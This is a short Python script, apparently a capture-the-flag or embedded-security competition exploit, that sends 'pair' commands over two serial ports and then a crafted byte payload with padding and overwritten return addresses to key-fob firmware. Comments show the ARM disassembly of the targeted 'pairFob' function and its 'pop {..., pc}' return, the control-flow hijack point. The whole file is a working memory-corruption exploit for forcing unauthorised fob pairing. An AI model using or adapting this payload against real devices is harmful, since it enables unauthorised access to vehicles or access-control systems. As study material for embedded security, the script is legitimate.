import serial

ser = serial.Serial("/dev/ttyACM0", baudrate=115200)
ser1 = serial.Serial("/dev/ttyACM1", baudrate=115200)
ser1.write(b"pair\n")
ser.write(b"pair\n")
ser.read(1)
ser.write(b"0" * 8 + b"\xdc\x1b" + chr(0).encode() + b"\x20" + b"0" * 8 + b"\x59\x86" + b"\n")
ser.close()

# 0x0000867a <+110>:	pop	{r4, r5, r6, pc}

# 0x00008656 <+74>:	cbz	r3, 0x8678 <pairFob+108>
#    0x00008658 <+76>:	movw	r3, #8277	; 0x2055
#    0x0000865c <+80>:	adds	r4, #1
#    0x0000865e <+82>:	strh.w	r3, [sp]
#    0x00008662 <+86>:	str	r4, [sp, #4]
#    0x00008664 <+88>:	bl	0x8ec0 <SysCtlClockGet>
#    0x00008668 <+92>:	movs	r3, #12
#    0x0000866a <+94>:	udiv	r0, r0, r3
#    0x0000866e <+98>:	bl	0x8eb4 <SysCtlDelay>
#    0x00008672 <+102>:	mov	r0, sp
#    0x00008674 <+104>:	bl	0x84e0 <send_board_message>
#    0x00008678 <+108>:	add	sp, #16
#    0x0000867a <+110>:	pop	{r4, r5, r6, pc}
